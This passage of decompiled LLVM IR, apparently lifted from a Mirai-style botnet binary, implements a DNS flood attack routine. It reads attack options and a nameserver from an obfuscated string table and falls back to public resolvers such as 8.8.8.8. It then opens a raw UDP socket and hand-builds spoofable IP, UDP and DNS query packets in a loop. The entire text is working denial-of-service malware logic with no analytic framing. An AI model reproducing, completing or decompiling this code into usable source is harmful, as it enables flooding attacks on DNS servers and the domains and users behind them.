  store i32 %v5_804cf94, i32* @eax, align 4
  %v0_804cfa4 = load i32, i32* @esi, align 4
  %v0_804cfa5 = load i32, i32* @ebx, align 4
  store i32 %v0_804cfa5, i32* %stack_var_-2220, align 4
  %v4_804cfa6 = trunc i32 %v0_804cfa5 to i8
  %v5_804cfa6 = call i32 @attack_get_opt_int(i8 %v4_804cfa6, i32 %v0_804cfa4, i32 7, i32 53)
  store i32 %v5_804cfa6, i32* @eax, align 4
  %v0_804cfb6 = load i32, i32* @esi, align 4
  %v0_804cfb7 = load i32, i32* @ebx, align 4
  %v4_804cfb8 = trunc i32 %v0_804cfb7 to i8
  %v5_804cfb8 = call i32 @attack_get_opt_int(i8 %v4_804cfb8, i32 %v0_804cfb6, i32 9, i32 65535)
  store i32 %v5_804cfb8, i32* @eax, align 4
  %v0_804cfc8 = load i32, i32* @esi, align 4
  %v0_804cfc9 = load i32, i32* @ebx, align 4
  store i32 %v0_804cfc9, i32* %stack_var_-2220, align 4
  %v4_804cfca = trunc i32 %v0_804cfc9 to i8
  %v5_804cfca = call i32 @attack_get_opt_int(i8 %v4_804cfca, i32 %v0_804cfc8, i32 0, i32 12)
  store i32 %v5_804cfca, i32* @eax, align 4
  %v0_804cfd7 = load i32, i32* @esi, align 4
  %v0_804cfd8 = load i32, i32* @ebx, align 4
  %v4_804cfd9 = trunc i32 %v0_804cfd8 to i8
  %v5_804cfd9 = call i32 @attack_get_opt_str(i8 %v4_804cfd9, i32 %v0_804cfd7, i32 8, i32 0)
  store i32 %v5_804cfd9, i32* %eax.global-to-local, align 4
  store i32 %v5_804cfd9, i32* @edi, align 4
  store i32 37, i32* %stack_var_-2220, align 4
  %v2_804cfe5 = call i32 @table_unlock_val(i8 37)
  store i32 %v0_804cfc8, i32* %eax.global-to-local, align 4
  store i32 37, i32* %stack_var_-2220, align 4
  %v3_804cff0 = call i32 @table_retrieve_val(i32 37, i32* null)
  store i32 %v3_804cff0, i32* @eax, align 4
  %v2_804cff5 = load i32, i32* %stack_var_-2220, align 4
  store i32 %v2_804cff5, i32* %ebx.global-to-local, align 4
  store i32 %v3_804cff0, i32* %stack_var_-2220, align 4
  %v2_804cffa = call i32 @__libc_open(i32 %v3_804cff0, i32 0)
  store i32 %v2_804cffa, i32* %eax.global-to-local, align 4
  store i32 37, i32* %stack_var_-2220, align 4
  store i32 %v2_804cffa, i32* @ebx, align 4
  %v2_804d008 = call i32 @table_lock_val(i8 37)
  store i32 %v2_804d008, i32* @eax, align 4
  %v0_804d010 = load i32, i32* @ebx, align 4
  %v2_804d010 = icmp slt i32 %v0_804d010, 0
  br i1 %v2_804d010, label %dec_label_pc_804d4a0, label %dec_label_pc_804d018

dec_label_pc_804d018:                             ; preds = %entry
  %v2_804d01e = ptrtoint i32* %stack_var_-2100 to i32
  store i32 %v2_804d01e, i32* %edx.global-to-local, align 4
  store i32 %v0_804d010, i32* %stack_var_-2220, align 4
  %v3_804d024 = call i32 @__libc_read(i32 %v0_804d010, i32 %v2_804d01e, i32 2048)
  store i32 %v3_804d024, i32* @eax, align 4
  %v0_804d029 = load i32, i32* @ebx, align 4
  store i32 %v0_804d029, i32* %stack_var_-2220, align 4
  store i32 %v3_804d024, i32* @esi, align 4
  %v1_804d02e = call i32 @__GI___libc_close(i32 %v0_804d029)
  store i32 %v1_804d02e, i32* %eax.global-to-local, align 4
  store i32 38, i32* %stack_var_-2220, align 4
  %v2_804d03a = call i32 @table_unlock_val(i8 38)
  %v2_804d03f = load i32, i32* %stack_var_-2220, align 4
  store i32 %v2_804d03f, i32* %eax.global-to-local, align 4
  store i32 %v2_804d01e, i32* %edx.global-to-local, align 4
  store i32 38, i32* %stack_var_-2220, align 4
  %v3_804d045 = call i32 @table_retrieve_val(i32 38, i32* null)
  store i32 %v3_804d045, i32* %eax.global-to-local, align 4
  %v0_804d04e = load i32, i32* @esi, align 4
  store i32 %v2_804d01e, i32* @ecx, align 4
  store i32 %v2_804d01e, i32* %stack_var_-2220, align 4
  %v3_804d054 = bitcast i32* %stack_var_-2100 to i8*
  %v4_804d054 = call i32 @util_stristr(i8* %v3_804d054, i32 %v0_804d04e, i32 %v3_804d045)
  store i32 %v4_804d054, i32* %eax.global-to-local, align 4
  store i32 %v4_804d054, i32* @ebp, align 4
  store i32 38, i32* %stack_var_-2220, align 4
  %v2_804d062 = call i32 @table_lock_val(i8 38)
  store i32 %v2_804d062, i32* %eax.global-to-local, align 4
  %v0_804d06a = load i32, i32* @ebp, align 4
  %v10_804d06a = icmp eq i32 %v0_804d06a, -1
  br i1 %v10_804d06a, label %dec_label_pc_804d4a0, label %dec_label_pc_804d073

dec_label_pc_804d073:                             ; preds = %dec_label_pc_804d018
  %v0_804d073 = load i32, i32* @esi, align 4
  %v2_804d073 = inttoptr i32 %v0_804d073 to i8*
  %v3_804d073 = inttoptr i32 %v0_804d06a to i8*
  %v9_804d075 = icmp sgt i8* %v2_804d073, %v3_804d073
  br i1 %v9_804d075, label %dec_label_pc_804d07b, label %dec_label_pc_804d4a0

dec_label_pc_804d07b:                             ; preds = %dec_label_pc_804d073
  store i32 %v0_804d06a, i32* @edx, align 4
  %v2_804d081 = add i32 %v0_804d06a, %v2_804d01e
  store i32 %v2_804d081, i32* %ecx.global-to-local, align 4
  %v1_804d088 = add i32 %v0_804d073, -1
  store i32 %v1_804d088, i32* @ebx, align 4
  br label %dec_label_pc_804d090

dec_label_pc_804d090:                             ; preds = %dec_label_pc_804d496, %dec_label_pc_804d07b
  %v0_804d0c1 = phi i32 [ %v0_804d06a, %dec_label_pc_804d07b ], [ %v1_804d496, %dec_label_pc_804d496 ]
  %v4_804d090 = phi i32 [ %v2_804d062, %dec_label_pc_804d07b ], [ %v4_804d09019, %dec_label_pc_804d496 ]
  %v0_804d497 = phi i32 [ %v2_804d081, %dec_label_pc_804d07b ], [ %v1_804d497, %dec_label_pc_804d496 ]
  %stack_var_-2129.0 = phi i8 [ 0, %dec_label_pc_804d07b ], [ %stack_var_-2129.2, %dec_label_pc_804d496 ]
  %v1_804d090 = inttoptr i32 %v0_804d497 to i8*
  %v2_804d090 = load i8, i8* %v1_804d090, align 1
  %v3_804d090 = zext i8 %v2_804d090 to i32
  %v5_804d090 = and i32 %v4_804d090, -256
  %v6_804d090 = or i32 %v3_804d090, %v5_804d090
  store i32 %v6_804d090, i32* %eax.global-to-local, align 4
  %v4_804d092 = icmp eq i8 %stack_var_-2129.0, 0
  %v1_804d097 = icmp eq i1 %v4_804d092, false
  br i1 %v1_804d097, label %dec_label_pc_804d0ae, label %dec_label_pc_804d099

dec_label_pc_804d099:                             ; preds = %dec_label_pc_804d090
  %v7_804d099 = icmp eq i8 %v2_804d090, 32
  br i1 %v7_804d099, label %dec_label_pc_804d496, label %dec_label_pc_804d0a1

dec_label_pc_804d0a1:                             ; preds = %dec_label_pc_804d099
  %v10_804d0a1 = icmp eq i8 %v2_804d090, 9
  br i1 %v10_804d0a1, label %dec_label_pc_804d496, label %dec_label_pc_804d0ae

dec_label_pc_804d0ae:                             ; preds = %dec_label_pc_804d090, %dec_label_pc_804d0a1
  %stack_var_-2129.1 = phi i8 [ 1, %dec_label_pc_804d0a1 ], [ %stack_var_-2129.0, %dec_label_pc_804d090 ]
  %v10_804d0ae = icmp eq i8 %v2_804d090, 46
  br i1 %v10_804d0ae, label %dec_label_pc_804d48e, label %dec_label_pc_804d0b6

dec_label_pc_804d0b6:                             ; preds = %dec_label_pc_804d0ae
  %v1_804d0b6 = add i32 %v6_804d090, -48
  %v8_804d0b6 = trunc i32 %v1_804d0b6 to i8
  store i32 %v1_804d0b6, i32* %eax.global-to-local, align 4
  %tmp110 = icmp ult i8 %v8_804d0b6, 10
  br i1 %tmp110, label %dec_label_pc_804d48e, label %dec_label_pc_804d0c1

dec_label_pc_804d0c1:                             ; preds = %dec_label_pc_804d48e, %dec_label_pc_804d0b6
  %v0_804d0c1.lcssa = phi i32 [ %v1_804d088, %dec_label_pc_804d48e ], [ %v0_804d0c1, %dec_label_pc_804d0b6 ]
  %v2_804d0c4 = sub i32 %v0_804d0c1.lcssa, %v0_804d06a
  store i32 %v2_804d0c4, i32* @ebx, align 4
  store i32 %v2_804d081, i32* %eax.global-to-local, align 4
  %v2_804d0ce = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_804d0ce, i32* %stack_var_-2220, align 4
  %v3_804d0d6 = call i32 @util_memcpy(i32 %v2_804d0ce, i32 %v2_804d081, i32 %v2_804d0c4)
  store i32 %v3_804d0d6, i32* %eax.global-to-local, align 4
  %v0_804d0db = load i32, i32* @esp, align 4
  %v1_804d0db = load i32, i32* @ebx, align 4
  %v2_804d0db = add i32 %v0_804d0db, 2168
  %v3_804d0db = add i32 %v2_804d0db, %v1_804d0db
  %v4_804d0db = inttoptr i32 %v3_804d0db to i8*
  store i8 0, i8* %v4_804d0db, align 1
  store i32 %v2_804d0ce, i32* %stack_var_-2220, align 4
  %v1_804d0e6 = call i32 @inet_addr(i32 %v2_804d0ce)
  store i32 %v1_804d0e6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d0f2

dec_label_pc_804d0f2:                             ; preds = %dec_label_pc_804d507, %dec_label_pc_804d502, %dec_label_pc_804d4a0, %dec_label_pc_804d4ad, %dec_label_pc_804d0c1
  %stack_var_-2168.0 = phi i32 [ %v1_804d0e6, %dec_label_pc_804d0c1 ], [ 134744072, %dec_label_pc_804d4ad ], [ %., %dec_label_pc_804d507 ], [ 707416650, %dec_label_pc_804d4a0 ], [ 104859200, %dec_label_pc_804d502 ]
  store i32 0, i32* %stack_var_-2220, align 4
  %v2_804d0f7 = call i32 @__GI_time(i32* null)
  %v2_804d103 = add i32 %v2_804d0f7, %arg1
  store i32 %v2_804d103, i32* %eax.global-to-local, align 4
  %v1_804d10c = icmp eq i32 %v5_804cfd9, 0
  br i1 %v1_804d10c, label %dec_label_pc_804d4cc, label %dec_label_pc_804d114

dec_label_pc_804d114:                             ; preds = %dec_label_pc_804d0f2
  store i32 %v5_804cfd9, i32* %stack_var_-2220, align 4
  %v1_804d118 = inttoptr i32 %v5_804cfd9 to i8*
  %v2_804d118 = call i32 @util_strlen(i8* %v1_804d118)
  store i32 %v2_804d118, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-2220, align 4
  %v3_804d12a = call i32 @socket(i32 2, i32 3, i32 17)
  %v1_804d136 = add i32 %v3_804d12a, 1
  %v8_804d136 = icmp eq i32 %v1_804d136, 0
  store i32 %v1_804d136, i32* %eax.global-to-local, align 4
  br i1 %v8_804d136, label %dec_label_pc_804d4cc, label %dec_label_pc_804d13d

dec_label_pc_804d13d:                             ; preds = %dec_label_pc_804d114
  store i32 1, i32* %stack_var_-20, align 4
  store i32 4, i32* %stack_var_-2220, align 4
  %v2_804d14d = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804d14d, i32* %eax.global-to-local, align 4
  %v5_804d15e = call i32 @__GI_setsockopt(i32 %v3_804d12a, i32 0, i32 3, i32 %v2_804d14d, i32 4)
  %v1_804d166 = add i32 %v5_804d15e, 1
  %v8_804d166 = icmp eq i32 %v1_804d166, 0
  store i32 %v1_804d166, i32* @eax, align 4
  br i1 %v8_804d166, label %dec_label_pc_804d4bc, label %dec_label_pc_804d16d

dec_label_pc_804d16d:                             ; preds = %dec_label_pc_804d13d
  %sext8 = mul i32 %v5_804cf61, 65536
  %v4_804d171 = sdiv i32 %sext8, 65536
  %sext9 = mul i32 %v5_804cf94, 65536
  %v4_804d175 = sdiv i32 %sext9, 65536
  %v1_804d179 = trunc i32 %v5_804cfa6 to i16
  %v1_804d182 = trunc i32 %v4_804d171 to i16
  %v2_804d187 = icmp eq i8 %arg2, 0
  store i32 %v4_804cf0a, i32* %ecx.global-to-local, align 4
  %v1_804d18d = trunc i32 %v4_804d175 to i16
  %sext10 = mul i32 %v5_804cfb8, 65536
  %v4_804d192 = sdiv i32 %sext10, 65536
  store i32 %v4_804d192, i32* %eax.global-to-local, align 4
  %sext11 = mul i32 %v5_804cfca, 16777216
  %v4_804d196 = sdiv i32 %sext11, 16777216
  %v7_804d196 = and i32 %v4_804d175, -256
  %v8_804d196 = or i32 %v4_804d196, %v7_804d196
  store i32 %v8_804d196, i32* %edx.global-to-local, align 4
  %v1_804d19a = trunc i32 %v4_804d192 to i16
  store i32 0, i32* %stack_var_-20, align 4
  %.pre = urem i32 %v5_804cfca, 256
  %.pre44 = add i32 %v2_804d118, %.pre
  br i1 %v2_804d187, label %dec_label_pc_804d16d.dec_label_pc_804d319_crit_edge, label %dec_label_pc_804d1bd

dec_label_pc_804d16d.dec_label_pc_804d319_crit_edge: ; preds = %dec_label_pc_804d16d
  %.pre47 = add i32 %.pre44, 27
  %.pre109 = add i32 %.pre44, 47
  br label %dec_label_pc_804d319

dec_label_pc_804d1bd:                             ; preds = %dec_label_pc_804d16d
  store i32 %.pre, i32* %edx.global-to-local, align 4
  %v1_804d1d9 = add i32 %.pre44, 47
  %v1_804d1dc = add i32 %.pre44, 27
  store i32 %v1_804d1dc, i32* %eax.global-to-local, align 4
  %v2_804d1df = call i16 @llvm.bswap.i16(i16 %v1_804d182)
  %v3_804d1df = zext i16 %v2_804d1df to i32
  %v5_804d1df = and i32 %v4_804d171, -65536
  %v6_804d1df = or i32 %v3_804d1df, %v5_804d1df
  store i32 %v6_804d1df, i32* %ecx.global-to-local, align 4
  %v1_804d1e3 = trunc i32 %v1_804d1dc to i16
  %v1_804d1ec = add i32 %v2_804d118, 1
  store i32 %v1_804d1ec, i32* @esi, align 4
  store i32 0, i32* @ebx, align 4
  %v1_804d1f4 = trunc i32 %v1_804d1d9 to i16
  %v2_804d1f4 = call i16 @llvm.bswap.i16(i16 %v1_804d1f4)
  %v3_804d1f4 = zext i16 %v2_804d1f4 to i32
  %v5_804d1f4 = and i32 %v1_804d1d9, -65536
  %v6_804d1f4 = or i32 %v3_804d1f4, %v5_804d1f4
  store i32 %v6_804d1f4, i32* @ebp, align 4
  %v4_804d21d = urem i32 %v5_804cf4c, 256
  %v4_804d234 = urem i32 %v5_804cf70, 256
  %v4_804d23e = icmp eq i8 %v6_804cf82, 0
  %v2_804d262 = call i16 @llvm.bswap.i16(i16 %v1_804d18d)
  %v2_804d26f = call i16 @llvm.bswap.i16(i16 %v1_804d179)
  %v2_804d27b = call i16 @llvm.bswap.i16(i16 %v1_804d1e3)
  %v2_804d29a = call i16 @llvm.bswap.i16(i16 %v1_804d19a)
  %v2_804d2a6 = add nuw nsw i32 %.pre, 41
  %tmp101 = icmp slt i32 %v2_804d118, 1
  %v2_804d2d6 = add i32 %v5_804cfd9, -1
  %v1_804d23b = trunc i32 %v5_804cf70 to i8
  br label %dec_label_pc_804d1f8

dec_label_pc_804d1f8:                             ; preds = %dec_label_pc_804d2eb.dec_label_pc_804d1f8_crit_edge, %dec_label_pc_804d1bd
  store i32 600, i32* %stack_var_-2220, align 4
  %v3_804d201 = call i32 @calloc(i64 600, i32 1)
  store i32 %v3_804cf3d, i32* %edx.global-to-local, align 4
  %v2_804d20a = load i32, i32* @ebx, align 4
  %v3_804d20a = mul i32 %v2_804d20a, 4
  %v4_804d20a = add i32 %v3_804d20a, %v3_804cf3d
  %v5_804d20a = inttoptr i32 %v4_804d20a to i32*
  store i32 %v3_804d201, i32* %v5_804d20a, align 4
  %v3_804d20d = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804d20d, i32* %eax.global-to-local, align 4
  %v0_804d214 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d214 = mul i32 %v3_804d20d, 4
  %v3_804d214 = add i32 %v0_804d214, %v2_804d214
  %v4_804d214 = inttoptr i32 %v3_804d214 to i32*
  %v5_804d214 = load i32, i32* %v4_804d214, align 4
  store i32 %v5_804d214, i32* %edx.global-to-local, align 4
  %v1_804d217 = inttoptr i32 %v5_804d214 to i8*
  store i8 69, i8* %v1_804d217, align 1
  %v0_804d21a = load i32, i32* %edx.global-to-local, align 4
  %v1_804d21a = add i32 %v0_804d21a, 20
  store i32 %v1_804d21a, i32* %ecx.global-to-local, align 4
  %v5_804d21d = load i32, i32* %eax.global-to-local, align 4
  %v6_804d21d = and i32 %v5_804d21d, -256
  %v7_804d21d = or i32 %v6_804d21d, %v4_804d21d
  store i32 %v7_804d21d, i32* %eax.global-to-local, align 4
  %v1_804d221 = add i32 %v0_804d21a, 28
  store i32 %v1_804d221, i32* %ebx.global-to-local, align 4
  %v3_804d224 = add i32 %v0_804d21a, 1
  %v4_804d224 = inttoptr i32 %v3_804d224 to i8*
  store i8 %v6_804cf4c, i8* %v4_804d224, align 1
  %v0_804d227 = load i32, i32* @ebp, align 4
  %v1_804d227 = trunc i32 %v0_804d227 to i16
  %v2_804d227 = load i32, i32* %edx.global-to-local, align 4
  %v3_804d227 = add i32 %v2_804d227, 2
  %v4_804d227 = inttoptr i32 %v3_804d227 to i16*
  store i16 %v1_804d227, i16* %v4_804d227, align 2
  %v5_804d22b = load i32, i32* %eax.global-to-local, align 4
  %v6_804d22b = and i32 %v5_804d22b, -65536
  %v7_804d22b = or i32 %v6_804d22b, %v3_804d1df
  store i32 %v7_804d22b, i32* %eax.global-to-local, align 4
  %v2_804d230 = load i32, i32* %edx.global-to-local, align 4
  %v3_804d230 = add i32 %v2_804d230, 4
  %v4_804d230 = inttoptr i32 %v3_804d230 to i16*
  store i16 %v2_804d1df, i16* %v4_804d230, align 2
  %v5_804d234 = load i32, i32* %eax.global-to-local, align 4
  %v6_804d234 = and i32 %v5_804d234, -256
  %v7_804d234 = or i32 %v6_804d234, %v4_804d234
  store i32 %v7_804d234, i32* %eax.global-to-local, align 4
  %v2_804d23b = load i32, i32* %edx.global-to-local, align 4
  %v3_804d23b = add i32 %v2_804d23b, 8
  %v4_804d23b = inttoptr i32 %v3_804d23b to i8*
  store i8 %v1_804d23b, i8* %v4_804d23b, align 1
  br i1 %v4_804d23e, label %dec_label_pc_804d24b, label %dec_label_pc_804d245

dec_label_pc_804d245:                             ; preds = %dec_label_pc_804d1f8
  %v0_804d245 = load i32, i32* %edx.global-to-local, align 4
  %v1_804d245 = add i32 %v0_804d245, 6
  %v2_804d245 = inttoptr i32 %v1_804d245 to i16*
  store i16 64, i16* %v2_804d245, align 2
  br label %dec_label_pc_804d24b

dec_label_pc_804d24b:                             ; preds = %dec_label_pc_804d1f8, %dec_label_pc_804d245
  %v0_804d24b = load i32, i32* %edx.global-to-local, align 4
  %v1_804d24b = add i32 %v0_804d24b, 9
  %v2_804d24b = inttoptr i32 %v1_804d24b to i8*
  store i8 17, i8* %v2_804d24b, align 1
  %v0_804d24f = load i32, i32* @global_var_805a858.27, align 8
  %v1_804d254 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d254 = add i32 %v1_804d254, 12
  %v3_804d254 = inttoptr i32 %v2_804d254 to i32*
  store i32 %v0_804d24f, i32* %v3_804d254, align 4
  %v1_804d25b = load i32, i32* %edx.global-to-local, align 4
  %v2_804d25b = add i32 %v1_804d25b, 16
  %v3_804d25b = inttoptr i32 %v2_804d25b to i32*
  store i32 %stack_var_-2168.0, i32* %v3_804d25b, align 4
  %v2_804d266 = load i32, i32* %edx.global-to-local, align 4
  %v3_804d266 = add i32 %v2_804d266, 20
  %v4_804d266 = inttoptr i32 %v3_804d266 to i16*
  store i16 %v2_804d262, i16* %v4_804d266, align 2
  %v2_804d273 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804d273 = add i32 %v2_804d273, 2
  %v4_804d273 = inttoptr i32 %v3_804d273 to i16*
  store i16 %v2_804d26f, i16* %v4_804d273, align 2
  %v2_804d27f = load i32, i32* %ecx.global-to-local, align 4
  %v3_804d27f = add i32 %v2_804d27f, 4
  %v4_804d27f = inttoptr i32 %v3_804d27f to i16*
  store i16 %v2_804d27b, i16* %v4_804d27f, align 2
  %v5_804d283 = load i32, i32* %ecx.global-to-local, align 4
  %v6_804d283 = and i32 %v5_804d283, -256
  %v7_804d283 = or i32 %v6_804d283, %.pre
  store i32 %v7_804d283, i32* %ecx.global-to-local, align 4
  %v0_804d28b = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d28b = add i32 %v0_804d28b, 2
  %v2_804d28b = inttoptr i32 %v1_804d28b to i16*
  store i16 1, i16* %v2_804d28b, align 2
  %v0_804d291 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d291 = add i32 %v0_804d291, 4
  %v2_804d291 = inttoptr i32 %v1_804d291 to i16*
  store i16 256, i16* %v2_804d291, align 2
  %v0_804d297 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804d297 = trunc i32 %v0_804d297 to i8
  %v2_804d297 = load i32, i32* %edx.global-to-local, align 4
  %v3_804d297 = add i32 %v2_804d297, 40
  %v4_804d297 = inttoptr i32 %v3_804d297 to i8*
  store i8 %v1_804d297, i8* %v4_804d297, align 1
  %v2_804d29e = load i32, i32* %edx.global-to-local, align 4
  %v3_804d29e = add i32 %v2_804d29e, 28
  %v4_804d29e = inttoptr i32 %v3_804d29e to i16*
  store i16 %v2_804d29a, i16* %v4_804d29e, align 2
  %v1_804d2a6 = load i32, i32* %edx.global-to-local, align 4
  %v3_804d2a6 = add i32 %v2_804d2a6, %v1_804d2a6
  store i32 %v3_804d2a6, i32* @ebx, align 4
  %v0_804d2ab = load i32, i32* @esi, align 4
  %v1_804d2ad = add i32 %v3_804d2a6, 1
  store i32 %v1_804d2ad, i32* %eax.global-to-local, align 4
  store i32 %v1_804d2ad, i32* %stack_var_-2220, align 4
  %v3_804d2b1 = call i32 @util_memcpy(i32 %v1_804d2ad, i32 %v5_804cfd9, i32 %v0_804d2ab)
  store i32 %v2_804d118, i32* %eax.global-to-local, align 4
  %v0_804d4f9 = load i32, i32* @ebx, align 4
  store i32 %v0_804d4f9, i32* %edx.global-to-local, align 4
  br i1 %tmp101, label %dec_label_pc_804d2eb, label %dec_label_pc_804d2c5

dec_label_pc_804d2c5:                             ; preds = %dec_label_pc_804d24b
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d2d6.outer

dec_label_pc_804d2d6.outer:                       ; preds = %dec_label_pc_804d2dd, %dec_label_pc_804d2c5
  %v2_804d2dd.ph = phi i32 [ %v2_804d2df, %dec_label_pc_804d2dd ], [ %v0_804d4f9, %dec_label_pc_804d2c5 ]
  %v0_804d2d0.ph = phi i32 [ %v1_804d2e2, %dec_label_pc_804d2dd ], [ 1, %dec_label_pc_804d2c5 ]
  br label %dec_label_pc_804d2d6

dec_label_pc_804d2d0:                             ; preds = %dec_label_pc_804d2d6
  %v1_804d2d0 = add i32 %v0_804d2d0, 1
  store i32 %v1_804d2d0, i32* %eax.global-to-local, align 4
  %v1_804d2d1 = add i32 %v0_804d2d1, 1
  store i32 %v1_804d2d1, i32* %ecx.global-to-local, align 4
  %v1_804d2d2 = load i32, i32* @esi, align 4
  %v12_804d2d2 = icmp eq i32 %v1_804d2d0, %v1_804d2d2
  br i1 %v12_804d2d2, label %dec_label_pc_804d2e9, label %dec_label_pc_804d2d6

dec_label_pc_804d2d6:                             ; preds = %dec_label_pc_804d2d6.outer, %dec_label_pc_804d2d0
  %v0_804d2d1 = phi i32 [ %v1_804d2d1, %dec_label_pc_804d2d0 ], [ 0, %dec_label_pc_804d2d6.outer ]
  %v0_804d2d0 = phi i32 [ %v1_804d2d0, %dec_label_pc_804d2d0 ], [ %v0_804d2d0.ph, %dec_label_pc_804d2d6.outer ]
  %v3_804d2d6 = add i32 %v2_804d2d6, %v0_804d2d0
  %v4_804d2d6 = inttoptr i32 %v3_804d2d6 to i8*
  %v5_804d2d6 = load i8, i8* %v4_804d2d6, align 1
  %v14_804d2d6 = icmp eq i8 %v5_804d2d6, 46
  %v1_804d2db = icmp eq i1 %v14_804d2d6, false
  br i1 %v1_804d2db, label %dec_label_pc_804d2d0, label %dec_label_pc_804d2dd

dec_label_pc_804d2dd:                             ; preds = %dec_label_pc_804d2d6
  %v1_804d2dd = trunc i32 %v0_804d2d1 to i8
  %v3_804d2dd = inttoptr i32 %v2_804d2dd.ph to i8*
  store i8 %v1_804d2dd, i8* %v3_804d2dd, align 1
  %v0_804d2df = load i32, i32* @ebx, align 4
  %v1_804d2df = load i32, i32* %eax.global-to-local, align 4
  %v2_804d2df = add i32 %v1_804d2df, %v0_804d2df
  store i32 %v2_804d2df, i32* %edx.global-to-local, align 4
  %v1_804d2e2 = add i32 %v1_804d2df, 1
  store i32 %v1_804d2e2, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_804d2e5 = load i32, i32* @esi, align 4
  %v12_804d2e5 = icmp eq i32 %v1_804d2e2, %v1_804d2e5
  %v1_804d2e7 = icmp eq i1 %v12_804d2e5, false
  br i1 %v1_804d2e7, label %dec_label_pc_804d2d6.outer, label %dec_label_pc_804d2e9

dec_label_pc_804d2e9:                             ; preds = %dec_label_pc_804d2dd, %dec_label_pc_804d2d0
  %v2_804d2eb35 = phi i32 [ %v2_804d2dd.ph, %dec_label_pc_804d2d0 ], [ %v2_804d2df, %dec_label_pc_804d2dd ]
  %v0_804d2e9 = phi i32 [ %v1_804d2d1, %dec_label_pc_804d2d0 ], [ 0, %dec_label_pc_804d2dd ]
  %v1_804d2e9 = urem i32 %v0_804d2e9, 256
  br label %dec_label_pc_804d2eb

dec_label_pc_804d2eb:                             ; preds = %dec_label_pc_804d24b, %dec_label_pc_804d2e9
  %v2_804d2eb = phi i32 [ %v2_804d2eb35, %dec_label_pc_804d2e9 ], [ %v0_804d4f9, %dec_label_pc_804d24b ]
  %storemerge = phi i32 [ %v1_804d2e9, %dec_label_pc_804d2e9 ], [ 0, %dec_label_pc_804d24b ]
  %v1_804d2eb = trunc i32 %storemerge to i8
  %v3_804d2eb = inttoptr i32 %v2_804d2eb to i8*
  store i8 %v1_804d2eb, i8* %v3_804d2eb, align 1
  store i32 %v2_804d118, i32* %edx.global-to-local, align 4
  %v0_804d2f1 = load i32, i32* @ebx, align 4
  %v2_804d2f1 = add i32 %v0_804d2f1, %v2_804d118
  store i32 %v2_804d2f1, i32* %eax.global-to-local, align 4
  %v3_804d2f4 = load i32, i32* %stack_var_-20, align 4
  %v1_804d2fb = add i32 %v3_804d2f4, 1
  store i32 %v1_804d2fb, i32* @ebx, align 4
  %v1_804d2fc = add i32 %v2_804d2f1, 2
  %v2_804d2fc = inttoptr i32 %v1_804d2fc to i16*
  store i16 256, i16* %v2_804d2fc, align 2
  %v0_804d302 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d302 = add i32 %v0_804d302, 4
  %v2_804d302 = inttoptr i32 %v1_804d302 to i16*
  store i16 256, i16* %v2_804d302, align 2
  %v0_804d308 = load i32, i32* @ebx, align 4
  store i32 %v0_804d308, i32* %stack_var_-20, align 4
  %v8_804d313 = icmp sgt i32 %v4_804cf0a, %v0_804d308
  br i1 %v8_804d313, label %dec_label_pc_804d2eb.dec_label_pc_804d1f8_crit_edge, label %dec_label_pc_804d319

dec_label_pc_804d2eb.dec_label_pc_804d1f8_crit_edge: ; preds = %dec_label_pc_804d2eb
  br label %dec_label_pc_804d1f8

dec_label_pc_804d319:                             ; preds = %dec_label_pc_804d2eb, %dec_label_pc_804d16d.dec_label_pc_804d319_crit_edge
  %v1_804d350.pre-phi = phi i32 [ %.pre109, %dec_label_pc_804d16d.dec_label_pc_804d319_crit_edge ], [ %v1_804d1d9, %dec_label_pc_804d2eb ]
  %v1_804d34d.pre-phi = phi i32 [ %.pre47, %dec_label_pc_804d16d.dec_label_pc_804d319_crit_edge ], [ %v1_804d1dc, %dec_label_pc_804d2eb ]
  store i32 %.pre, i32* %ecx.global-to-local, align 4
  store i32 %.pre44, i32* %eax.global-to-local, align 4
  store i32 %.pre, i32* @ebp, align 4
  %v13_804d426 = icmp eq i16 %v1_804d182, -1
  %v13_804d362 = icmp eq i16 %v1_804d18d, -1
  %v13_804d455 = icmp eq i16 %v1_804d179, -1
  %v13_804d37a = icmp eq i16 %v1_804d19a, -1
  %v1_804d435 = icmp eq i1 %v13_804d426, false
  %v1_804d45f = icmp eq i1 %v13_804d455, false
  %v1_804d474 = icmp eq i1 %v13_804d37a, false
  %v1_804d44a = icmp eq i1 %v13_804d362, false
  br label %dec_label_pc_804d32f

dec_label_pc_804d32f:                             ; preds = %dec_label_pc_804d4d7, %dec_label_pc_804d319
  store i32 0, i32* %stack_var_-20, align 4
  br i1 %v2_804d187, label %dec_label_pc_804d32f.dec_label_pc_804d4d7_crit_edge, label %dec_label_pc_804d345

dec_label_pc_804d32f.dec_label_pc_804d4d7_crit_edge: ; preds = %dec_label_pc_804d32f
  br label %dec_label_pc_804d4d7

dec_label_pc_804d345:                             ; preds = %dec_label_pc_804d32f
  store i32 %v1_804d34d.pre-phi, i32* %edx.global-to-local, align 4
  store i32 %v1_804d350.pre-phi, i32* @ecx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d422

dec_label_pc_804d362:                             ; preds = %dec_label_pc_804d422
  br i1 %v13_804d362, label %dec_label_pc_804d450, label %dec_label_pc_804d36e

dec_label_pc_804d36e:                             ; preds = %dec_label_pc_804d43b, %dec_label_pc_804d362
  br i1 %v13_804d455, label %dec_label_pc_804d465, label %dec_label_pc_804d37a

dec_label_pc_804d37a:                             ; preds = %dec_label_pc_804d450, %dec_label_pc_804d36e
  br i1 %v13_804d37a, label %dec_label_pc_804d480, label %dec_label_pc_804d386

dec_label_pc_804d386:                             ; preds = %dec_label_pc_804d465, %dec_label_pc_804d37a, %dec_label_pc_804d480
  %v0_804d386 = load i32, i32* @ecx, align 4
  %v0_804d388 = load i32, i32* @ebp, align 4
